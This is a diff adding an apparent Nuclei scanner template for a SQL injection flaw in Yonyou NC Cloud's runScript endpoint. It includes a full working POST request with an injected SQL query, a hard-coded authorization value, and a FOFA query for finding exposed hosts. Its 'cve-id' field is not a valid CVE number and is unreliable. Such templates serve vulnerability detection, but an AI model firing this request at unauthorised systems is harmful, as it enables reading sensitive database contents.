@@ -1,0 +1,46 @@
+id: 2024-105100017
+
+info:
+  name: 用友NCCloud系统runScript存在SQL注入漏洞
+  author: k3ppf0r
+  severity: high
+  description: |  
+    用友NC Cloud runScript 接口存在SQL注入漏洞，攻击者利用此漏洞可以获取数据库敏感数据。
+  reference:
+    - https://cn-sec.com/archives/2611041.html
+    - https://blog.csdn.net/2301_80733390/article/details/136891472
+  remediation: |
+    打对应补丁，重启服务
+  classification:
+    cve-id: 2024-105100017
+    cvss-score: 7.1
+    cwe-id: CWE-89
+  metadata:
+    date: 2024-03-28
+    version: 用友NCCloud
+    fofa-query: app="用友-NC-Cloud"
+  tags: yonyou,sqli,1day,yonyounc,ncc
+
+http:
+  - raw:
+      - |
+        POST /ncchr/attendScript/internal/runScript HTTP/1.1
+        Host: 127.0.0.1:8888
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Language: en
+        Authorization: 58e00466213416018d01d15de83b0198
+        Content-Length: 59
+
+        key=1&script=select 1,111*111,USER,4,5,6,7,8,9,10 from dual
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body, "USER")
+        condition: and
